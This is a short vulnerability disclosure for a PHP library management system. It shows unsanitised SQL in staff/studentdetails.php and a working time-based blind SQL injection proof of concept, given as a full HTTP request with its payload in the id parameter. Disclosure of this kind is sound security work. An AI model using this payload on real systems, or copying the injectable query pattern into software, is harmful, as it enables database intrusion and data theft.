### Vulnerability file address

`staff/studentdetails.php` from line 106

The incoming $rno variable is not filtered, there is sql injection

```php
......
......
......
 $rno=$_GET['id'];
$sql="select * from LMS.user where RollNo='$rno'";
$result=$conn->query($sql);
$row=$result->fetch_assoc();   
......
......
......
```

### POC

not exists any precondition

```http
GET /staff/studentdetails.php?id=1'+or+if(ascii(user())=115,sleep(0.5),0)%23 HTTP/1.1
Host: www.lms.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

### Attack results pictures

Blind sql injection succeed

![image-20220702181539777](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220702181539.png)



Blind sql injection failed

![image-20220702181554560](https://xianyu123images.oss-cn-hangzhou.aliyuncs.com/20220702181554.png)